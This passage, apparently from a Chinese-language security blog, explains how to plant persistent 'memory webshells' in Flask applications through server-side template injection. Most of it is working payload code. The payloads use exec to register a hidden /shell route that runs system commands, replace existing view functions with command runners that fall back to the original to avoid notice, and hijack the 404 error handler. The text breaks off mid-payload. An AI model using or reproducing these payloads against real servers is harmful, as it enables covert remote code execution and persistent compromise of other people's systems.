<p><img src="/./../../../source/images/%E6%9E%84%E9%80%A0%E5%86%85%E5%AD%98%E9%A9%AC7.png"></p>
<p>然后我们继续访问我们现在生成的shell</p>
<p><img src="/./../../../source/images/%E6%9E%84%E9%80%A0%E5%86%85%E5%AD%98%E9%A9%AC8.png"></p>
<p><img src="/./../../../source/images/%E6%9E%84%E9%80%A0%E5%86%85%E5%AD%98%E9%A9%AC9.png"></p>
<p>很好，不出意外又出了问题，这次是request无法被找到，想办法导入吧</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python">name<span class="token operator">=</span><span class="token punctuation">&#123;</span><span class="token punctuation">&#123;</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">.</span>__class__<span class="token punctuation">.</span>__base__<span class="token punctuation">.</span>__subclasses__<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">668</span><span class="token punctuation">]</span><span class="token punctuation">.</span>__init__<span class="token punctuation">.</span>__globals__<span class="token punctuation">[</span><span class="token string">'__builtins__'</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token keyword">exec</span><span class="token punctuation">(</span><span class="token string">"app._got_first_request=False;app.add_url_rule('/shell', 'shell', lambda: '&lt;pre>&#123;0&#125;&lt;/pre>'.format(__import__('os').popen(__import__('flask').request.args.get('cmd')).read()));app._got_first_request = True"</span><span class="token punctuation">,</span> <span class="token punctuation">&#123;</span><span class="token string">'app'</span><span class="token punctuation">:</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">.</span>__class__<span class="token punctuation">.</span>__base__<span class="token punctuation">.</span>__subclasses__<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">668</span><span class="token punctuation">]</span><span class="token punctuation">.</span>__init__<span class="token punctuation">.</span>__globals__<span class="token punctuation">[</span><span class="token string">'current_app'</span><span class="token punctuation">]</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>讲我们执行命令的地方的request换成<code>__import__(&#39;flask&#39;).request</code>就能成功执行了</p>
<p><img src="/./../../../source/images/%E6%9E%84%E9%80%A0%E5%86%85%E5%AD%98%E9%A9%AC10.png"></p>
<p>成功执行命令，除了上面的那种payload之外，还有更简单的，不要去所存在的类中一个一个找flask，我们直接找一个flask中用到的函数，就比如所上面的url_for，我们直接在他的全局变量空间里面寻找，通常都是存在的</p>
<p>payload如下：</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token punctuation">&#123;</span><span class="token punctuation">&#123;</span> url_for<span class="token punctuation">.</span>__globals__<span class="token punctuation">[</span><span class="token string">'__builtins__'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'exec'</span><span class="token punctuation">]</span><span class="token punctuation">(</span>
"
app<span class="token punctuation">.</span>_got_first_request<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">;</span>
app<span class="token punctuation">.</span>add_url_rule<span class="token punctuation">(</span><span class="token string">'/shell'</span><span class="token punctuation">,</span> <span class="token string">'shell'</span><span class="token punctuation">,</span> <span class="token keyword">lambda</span><span class="token punctuation">:</span> <span class="token string">'&lt;pre>&#123;0&#125;&lt;/pre>'</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span><span class="token builtin">__import__</span><span class="token punctuation">(</span><span class="token string">'os'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>popen<span class="token punctuation">(</span>request<span class="token punctuation">.</span>args<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'cmd'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
<span class="token punctuation">)</span><span class="token punctuation">;</span>
app<span class="token punctuation">.</span>_got_first_request<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">;</span>
"<span class="token punctuation">,</span> 
<span class="token punctuation">&#123;</span><span class="token string">'request'</span><span class="token punctuation">:</span>url_for<span class="token punctuation">.</span>__globals__<span class="token punctuation">[</span><span class="token string">'request'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token string">'app'</span><span class="token punctuation">:</span>url_for<span class="token punctuation">.</span>__globals__<span class="token punctuation">[</span><span class="token string">'current_app'</span><span class="token punctuation">]</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>一样是能成功的。</p>
<p>现在我们的都能执行命令了，但假设说我们需要修改这个内存马中的内容又该如何操作呢</p>
<h5 id="请求方法和执行结果"><a href="#请求方法和执行结果" class="headerlink" title="请求方法和执行结果"></a>请求方法和执行结果</h5><p>我们要想修改我们的内存马，我们就需要获取原来的匿名函数进行修改，因为再后续修改的话 flask 中有一个判断视图函数和旧的端点对应函数是不是一个，不是的话会抛出异常，函数是<code>flask.sansio.app.App.add_url_rule</code>，并且也不止这一种方法，这个函数只是简化了流程，实际上可以直接去操作：<code>werkzeug.routing.map.Map</code>和<code>werkzeug.routing.rules.Rule</code>这个类以及视图函数结构</p>
<p><img src="/./../../../source/images/%E4%BF%AE%E6%94%B9%E5%86%85%E5%AD%98%E9%A9%AC1.png"></p>
<p>同时，我们上面的exec在执行代码的时候是没有回显的，eval执行代码有回显，但是又不能执行多行代码，我们可以通过可以多次执行<code>eval</code>，也可以在<code>exec</code>执行的时候将结果保存到全局变量中，<code>eval</code>再去获取来解决这个问题。请求方式<code>add_url_rule</code>函数是支持的。</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token punctuation">&#123;</span><span class="token punctuation">&#123;</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">.</span>__class__<span class="token punctuation">.</span>__base__<span class="token punctuation">.</span>__subclasses__<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">668</span><span class="token punctuation">]</span><span class="token punctuation">.</span>__init__<span class="token punctuation">.</span>__globals__<span class="token punctuation">[</span><span class="token string">'__builtins__'</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token keyword">exec</span><span class="token punctuation">(</span><span class="token string">"app._got_first_request=False;app.add_url_rule('/shell', 'shell', lambda: eval(__import__('flask').request.values['cmd']), methods=['POST','GET']);app._got_first_request = True"</span><span class="token punctuation">,</span> <span class="token punctuation">&#123;</span><span class="token string">'app'</span><span class="token punctuation">:</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">.</span>__class__<span class="token punctuation">.</span>__base__<span class="token punctuation">.</span>__subclasses__<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">668</span><span class="token punctuation">]</span><span class="token punctuation">.</span>__init__<span class="token punctuation">.</span>__globals__<span class="token punctuation">[</span><span class="token string">'current_app'</span><span class="token punctuation">]</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>这段能成功创建路由，但现在执行代码会在终端执行，并且不返回结果，很迷就。报错给GPT说是执行完之后的进程结束，返回值为0，所以回显结果。我执行的命令是<code>__import__(&#39;os&#39;).system(&#39;dir&#39;)</code>。换成<code>__import__(&#39;os&#39;).popen(&#39;dir&#39;).read()</code>就行了，就有返回结果了。</p>
<p>现在回显的问题解决了，我们来看看无法执行多行命令的问题</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token punctuation">&#123;</span><span class="token punctuation">&#123;</span> url_for<span class="token punctuation">.</span>__globals__<span class="token punctuation">[</span><span class="token string">'__builtins__'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'exec'</span><span class="token punctuation">]</span><span class="token punctuation">(</span>
"
my_func <span class="token operator">=</span> <span class="token keyword">lambda</span><span class="token punctuation">:</span> <span class="token builtin">eval</span><span class="token punctuation">(</span>request<span class="token punctuation">.</span>values<span class="token punctuation">[</span><span class="token string">'cmd'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
app<span class="token punctuation">.</span>view_functions<span class="token punctuation">[</span><span class="token string">'shell'</span><span class="token punctuation">]</span> <span class="token operator">=</span> my_func<span class="token punctuation">;</span>
app<span class="token punctuation">.</span>_got_first_request<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">;</span>
app<span class="token punctuation">.</span>add_url_rule<span class="token punctuation">(</span><span class="token string">'/shell'</span><span class="token punctuation">,</span> <span class="token string">'shell'</span><span class="token punctuation">,</span> my_func<span class="token punctuation">,</span> methods<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">'POST'</span><span class="token punctuation">,</span><span class="token string">'GET'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
app<span class="token punctuation">.</span>_got_first_request<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">;</span>
"<span class="token punctuation">,</span> 
<span class="token punctuation">&#123;</span><span class="token string">'request'</span><span class="token punctuation">:</span>url_for<span class="token punctuation">.</span>__globals__<span class="token punctuation">[</span><span class="token string">'request'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token string">'app'</span><span class="token punctuation">:</span>url_for<span class="token punctuation">.</span>__globals__<span class="token punctuation">[</span><span class="token string">'current_app'</span><span class="token punctuation">]</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>正如上面所说，我们通过多次执行eval来执行便能成功执行</p>
<p>现在需要修改路由的请求方式，在其它语言的webshell通常是通过文件上传来实现修改，请求方式是可控的，我们在定义路由的时候就定义了请求方法，但假设现在我们需要修改一个确定请求方式的路由的请求方式，又要如何做呢，举个例子：</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/nonono'</span><span class="token punctuation">)</span>
<span class="token keyword">def</span> <span class="token function">my_view</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
 <span class="token keyword">return</span> <span class="token string">"Hello, nonono!"</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>

<p>假设有这样一段代码，在未指定请求方式的时候默认为GET，使用POST是会回显不允许</p>
<p><img src="/./../../../source/images/%E4%BF%AE%E6%94%B9%E5%86%85%E5%AD%98%E9%A9%AC2.png"></p>
<p>这里先跳过了一下默认注册的路由比如<code>/</code> <code>/static</code>，<code>@app.route</code>装饰器函数使用了<code>@setupmethod -- flask.setupmethod</code>装饰器来校验Flask实例是否开启了debug模式并且获取第一个请求，这里无关紧要，随后调用了<code>self.add_url_rule(rule, endpoint, f, **options)</code>这里的调用并不是下面的那个函数<code>flask.sansio.scaffold.Scaffold.add_url_rule</code>，而是<code>flask.sansio.app.App.add_url_rule()</code><br><img src="/./../../../source/images/%E6%9E%84%E9%80%A0%E5%86%85%E5%AD%98%E9%A9%AC11.png"></p>
<p>同样在校验后来到这个函数里。就是一些属性的设置，比如添加默认的一些请求方式。<br><a target="_blank" rel="noopener" href="https://www.mewo.cc/usr/uploads/2024/06/2561587472.png"><img src="https://www.mewo.cc/usr/uploads/2024/06/2561587472.png" alt="2024-06-22T10:38:57.png"></a></p>
<p>这个时候将路由实例化为了<code>werkzeug.routing.rules.Rule</code>对象，后续就是将这个路由对象添加到 Flask 应用上下文的变量中，这些变量（属性）会在后面用来确定路由和视图函数、端点的对应关系。这个路由对象里没有什么特殊的操作，基本就是各种属性设置了。<br><img src="https://www.mewo.cc/usr/uploads/2024/06/1699682171.png" alt="2024-06-22T10:39:05.png"><br>单步步过到<code>self.url_map.add(rule)</code>这里，<code>url_map</code>是<code>werkzeug.routing.map.Map</code>对象，这里由于是补充内容忘记提了，<code>url_map</code> 在 Flask 应用上下文中还表示路由和端点的对应关系。</p>
<p><img src="/./../../../source/images/%E6%9E%84%E9%80%A0%E5%86%85%E5%AD%98%E9%A9%AC12.png"></p>
<p>这里调用了<code>werkzeug.routing.map.Map.add()</code>方法，其实最终就是操作了<code>_rules_by_endpoint</code>这个数据结构，以端点名作为键，键值为一个路由类的列表。</p>
<p><img src="/./../../../source/images/%E6%9E%84%E9%80%A0%E5%86%85%E5%AD%98%E9%A9%AC13.png"></p>
<p><img src="/./../../../source/images/%E6%9E%84%E9%80%A0%E5%86%85%E5%AD%98%E9%A9%AC14.png"></p>
<p>可以看到请求方法的定义是在路由类中实现的，这里看到的形如<code>&#39;my_view&#39;: [&lt;Rule &#39;/nonono&#39; (GET, HEAD, OPTIONS) -&gt; my_view&gt;]</code>的键值对，这个键值是在路由类中使用了工厂类的迭代器得到的，没有继续跟下去的必要了，反正目前拿到了这个数据结构的位置，就尝试去修改一下，由于是一个迭代得到的需要参考工厂类的实现来做。<br>现在要修改<code>/nonono</code>的请求方法，端点为<code>my_view</code>，查看一下这个类里的属性，这样可以避免直接进入到工厂类去跟。这里有一个<code>methods</code>属性，是一个集合。</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token punctuation">&#123;</span><span class="token punctuation">&#123;</span> url_for<span class="token punctuation">.</span>__globals__<span class="token punctuation">[</span><span class="token string">'current_app'</span><span class="token punctuation">]</span><span class="token punctuation">.</span>url_map<span class="token punctuation">.</span>_rules_by_endpoint<span class="token punctuation">.</span>my_view<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>__dict__ <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p><img src="/./../../../source/images/%E6%9E%84%E9%80%A0%E5%86%85%E5%AD%98%E9%A9%AC15.png"></p>
<p>往集合添加一个<code>POST</code>再看看，就已经可以对路由进行<code>POST</code>请求了。下面的内容中没有提到这一点，所以可以参考这个来修改。</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token punctuation">&#123;</span><span class="token punctuation">&#123;</span> url_for<span class="token punctuation">.</span>__globals__<span class="token punctuation">[</span><span class="token string">'current_app'</span><span class="token punctuation">]</span><span class="token punctuation">.</span>url_map<span class="token punctuation">.</span>_rules_by_endpoint<span class="token punctuation">.</span>my_view<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>methods<span class="token punctuation">.</span>add<span class="token punctuation">(</span><span class="token string">'POST'</span><span class="token punctuation">)</span> <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span>

<span class="token comment"># url_for.__globals__['current_app'].url_map._rules_by_endpoint.端点名/视图函数名[0].methods.add('POST')</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>

<p><img src="/./../../../source/images/%E6%9E%84%E5%BB%BA%E5%86%85%E5%AD%98%E9%A9%AC16.png"></p>
<p>对于执行结果，Python 中 <code>eval</code> 函数有返回值，但是只能执行单行代码，<code>exec</code> 函数可以执行多行代码，但是返回值永远为空。Flask 在遇到视图函数返回值为空的时候会直接抛出异常。对于实现内存马来说我们需要的还是代码执行而不光是一个 cmdshell。<br>如果需要执行多行代码并且返回结果的话，一种是不使用 lambda 函数作为视图函数，这需要我们在 SSTI 漏洞利用的时候使用 <code>exec</code> 函数，这样可以直接写上需要的函数作为视图函数。</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token punctuation">&#123;</span><span class="token punctuation">&#123;</span> url_for<span class="token punctuation">.</span>__globals__<span class="token punctuation">[</span><span class="token string">'__builtins__'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'exec'</span><span class="token punctuation">]</span><span class="token punctuation">(</span>
"
<span class="token keyword">def</span> <span class="token function">my_func</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    data <span class="token operator">=</span> <span class="token string">'hello'</span>
    <span class="token keyword">return</span> data
app<span class="token punctuation">.</span>view_functions<span class="token punctuation">[</span><span class="token string">'shell'</span><span class="token punctuation">]</span> <span class="token operator">=</span> my_func<span class="token punctuation">;</span>
app<span class="token punctuation">.</span>_got_first_request<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">;</span>
app<span class="token punctuation">.</span>add_url_rule<span class="token punctuation">(</span><span class="token string">'/shell'</span><span class="token punctuation">,</span> <span class="token string">'shell'</span><span class="token punctuation">,</span> my_func<span class="token punctuation">,</span> methods<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">'POST'</span><span class="token punctuation">,</span><span class="token string">'GET'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
app<span class="token punctuation">.</span>_got_first_request<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">;</span>
"<span class="token punctuation">,</span> 
<span class="token punctuation">&#123;</span><span class="token string">'request'</span><span class="token punctuation">:</span>url_for<span class="token punctuation">.</span>__globals__<span class="token punctuation">[</span><span class="token string">'request'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token string">'app'</span><span class="token punctuation">:</span>url_for<span class="token punctuation">.</span>__globals__<span class="token punctuation">[</span><span class="token string">'current_app'</span><span class="token punctuation">]</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<h4 id="修改视图函数"><a href="#修改视图函数" class="headerlink" title="修改视图函数"></a><strong>修改视图函数</strong></h4><p> @app.endpoint</p>
<p>这个装饰器使用来建立视图函数于路由的关系，用法如下：</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python">app<span class="token punctuation">.</span>add_url_rule<span class="token punctuation">(</span><span class="token string">"/"</span><span class="token punctuation">,</span> endpoint<span class="token operator">=</span><span class="token string">"index"</span><span class="token punctuation">)</span>

<span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>endpoint</span><span class="token punctuation">(</span><span class="token string">"index"</span><span class="token punctuation">)</span>
<span class="token keyword">def</span> <span class="token function">index</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>在一个请求开始进行处理的时候，会在<code>flask.app.Flask.dispatch_request</code>函数中从<code>view_functions</code>中找到对应的视图函数来进行处理，我们可以通过<code>url_for.__globals__[&#39;current_app&#39;].__dict__[&#39;url_map&#39;]</code>来查看当前应用上下文中的<code>endpoint</code>和路由的对应关系，也就知道了有哪些<code>endpoint</code>，如果没有设置<code>endpoint</code>，那么默认就是其视图函数名，可以通过<code>url_for.__globals__[&#39;current_app&#39;].__dict__[&#39;view_functions&#39;]</code>查看视图函数，这样可以区别出哪些是<code>endpoint</code>，哪些是视图函数。</p>
<p><img src="/./../../../source/images/%E4%BF%AE%E6%94%B9%E8%A7%86%E5%9B%BE%E5%87%BD%E6%95%B0.png"></p>
<p>比如说我例子中的代码由这样几个视图函数：</p>
<p><img src="/./../../../source/images/%E4%BF%AE%E6%94%B9%E8%A7%86%E5%9B%BE%E5%87%BD%E6%95%B01.png"></p>
<p>拿这个my_view路由说，假设我们直接修改的话，这一整个路由都会编程内存马，会影响起本身的功能，非常容易被发现，我们需要在不影响其原本功能的情况下来执行我们的内存马：</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token punctuation">&#123;</span><span class="token punctuation">&#123;</span> url_for<span class="token punctuation">.</span>__globals__<span class="token punctuation">[</span><span class="token string">'__builtins__'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'exec'</span><span class="token punctuation">]</span><span class="token punctuation">(</span>
"
app<span class="token punctuation">.</span>backup_func<span class="token operator">=</span>app<span class="token punctuation">.</span>view_functions<span class="token punctuation">[</span><span class="token string">'my_view'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
app<span class="token punctuation">.</span>view_functions<span class="token punctuation">[</span><span class="token string">'my_view'</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token keyword">lambda</span> <span class="token punctuation">:</span> <span class="token builtin">__import__</span><span class="token punctuation">(</span><span class="token string">'os'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>popen<span class="token punctuation">(</span>request<span class="token punctuation">.</span>args<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'cmd'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">if</span> <span class="token string">'cmd'</span> <span class="token keyword">in</span> request<span class="token punctuation">.</span>args<span class="token punctuation">.</span>keys<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">is</span> <span class="token keyword">not</span> <span class="token boolean">None</span> <span class="token keyword">else</span> app<span class="token punctuation">.</span>backup_func<span class="token punctuation">(</span><span class="token punctuation">)</span>
"<span class="token punctuation">,</span> 
<span class="token punctuation">&#123;</span><span class="token string">'request'</span><span class="token punctuation">:</span>url_for<span class="token punctuation">.</span>__globals__<span class="token punctuation">[</span><span class="token string">'request'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token string">'app'</span><span class="token punctuation">:</span>url_for<span class="token punctuation">.</span>__globals__<span class="token punctuation">[</span><span class="token string">'current_app'</span><span class="token punctuation">]</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span> <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span>

<span class="token comment"># 直接</span>
app<span class="token punctuation">.</span>view_functions<span class="token punctuation">[</span><span class="token string">'hello_endpoint'</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token keyword">lambda</span> <span class="token punctuation">:</span> <span class="token builtin">__import__</span><span class="token punctuation">(</span><span class="token string">'os'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>popen<span class="token punctuation">(</span>request<span class="token punctuation">.</span>args<span class="token punctuation">.</span>get<span class="token punctuation">(</span>request<span class="token punctuation">.</span>args<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'cmd'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p><img src="/./../../../source/images/%E4%BF%AE%E6%94%B9%E8%A7%86%E5%9B%BE%E5%87%BD%E6%95%B02.png"></p>
<h4 id="利用请求拦截实现内存马"><a href="#利用请求拦截实现内存马" class="headerlink" title="利用请求拦截实现内存马"></a>利用请求拦截实现内存马</h4><h5 id="app-errorhandler"><a href="#app-errorhandler" class="headerlink" title="@app.errorhandler"></a>@app.errorhandler</h5><p>它是 Flask 框架中的一个装饰器，用于自定义处理特定错误或异常。当 Flask 应用程序遇到某个错误（如 404 Not Found、500 Internal Server Error 等）时，可以使用这个装饰器来定义如何处理这些错误，并返回一个自定义的响应。</p>
<p>用法如下：</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> flask <span class="token keyword">import</span> Flask<span class="token punctuation">,</span> render_template

app <span class="token operator">=</span> Flask<span class="token punctuation">(</span>__name__<span class="token punctuation">)</span>

<span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>errorhandler</span><span class="token punctuation">(</span><span class="token number">404</span><span class="token punctuation">)</span>
<span class="token keyword">def</span> <span class="token function">page_not_found</span><span class="token punctuation">(</span>error<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">return</span> render_template<span class="token punctuation">(</span><span class="token string">'404.html'</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">404</span>

<span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>errorhandler</span><span class="token punctuation">(</span><span class="token number">500</span><span class="token punctuation">)</span>
<span class="token keyword">def</span> <span class="token function">internal_server_error</span><span class="token punctuation">(</span>error<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">return</span> <span class="token string">"An unexpected error occurred. Please try again later."</span><span class="token punctuation">,</span> <span class="token number">500</span>

<span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>
    app<span class="token punctuation">.</span>run<span class="token punctuation">(</span>debug<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>在发生错误请求的时候，会调用会调用<code>flask.sansio.app.App._find_error_handler</code>的函数遍历<code>error_handler_spec</code>找到对应错误的处理函数。可以通过<code>url_for.__globals__[&#39;current_app&#39;].__dict__[&#39;error_handler_spec&#39;]</code>查看有没有错误处理函数。</p>
<p><img src="/./../../../source/images/%E8%B7%AF%E7%94%B1%E6%8B%A6%E6%88%AA%E6%9E%84%E5%BB%BA%E5%86%85%E5%AD%98%E9%A9%AC1.png"></p>
<p>使用下面的 Payload 可以实现针对<code>404</code>错误的内存马，当访问一个不存在的路由就会触发</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token punctuation">&#123;</span><span class="token punctuation">&#123;</span> url_for<span class="token punctuation">.</span>__globals__<span class="token punctuation">[</span><span class="token string">'__builtins__'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'exec'</span><span class="token punctuation">]</span><span class="token punctuation">(</span>
"
app<span class="token punctuation">.</span>backup_errfunc<span class="token operator">=</span>app<span class="token punctuation">.</span>error_handler_spec<span class="token punctuation">[</span><span class="token boolean">None</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">404</span><span class="token punctuation">]</span><span class="token punctuation">[</span>app<span class="token punctuation">.</span>_get_exc_class_and_code<span class="token punctuation">(</span><span class="token number">404</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
app<span class="token punctuation">.</span>error_handler_spec<span class="token punctuation">[</span><span class="token boolean">None</span><span class="token punctuation">]</span><span class="token punctuation">[</span>app<span class="token punctuation">.</span>_get_exc_class_and_code<span class="token punctuation">(</span><span class="token number">404</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">[</span>app<span class="token punctuation">.</span>_get_exc_class_and_code<span class="token punctuation">(</span><span class="token number">404</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token keyword">lambda</span> c<span class="token punctuation">:</span> <span class="token builtin">__import__</span><span class="token punctuation">(</span><span class="token string">'os'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>popen<span class="token punctuation">(</span>request<span class="token punctuation">.</span>args<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'cmd'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">if</span> <span class="token string">'cmd'</span> <span class="token keyword">in</span> request<span class="token punctuation">.</span>args<span class="token punctuation">.</span>keys<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">else</span> app<span class="token punctuation">.</span>backup_errfunc<span class="token punctuation">(</span>c<span class="token punctuation">)</span>
"<span class="token punctuation">,</span> 
<span class="token punctuation">&#123;</span><span class="token string">'request'</span><span class="token punctuation">:</span>url_for<span class="token punctuation">.</span>__globals__<span class="token punctuation">[</span><span class="token string">'request'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token string">'app'</span><span class="token punctuation">:</span>url_for<span class="token punctuation">.</span>__globals__<span class="token punctuation">[</span><span class="token string">'current_app'</span><span class="token punctuation">]</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span> <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token punctuation">&#123;</span><span class="token punctuation">&#123;</span> url_for<span class="token punctuation">.</span>__globals__<span class="token punctuation">[</span><span class="token string">'__builtins__'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'exec'</span><span class="token punctuation">]</span><span class="token punctuation">(</span>
"
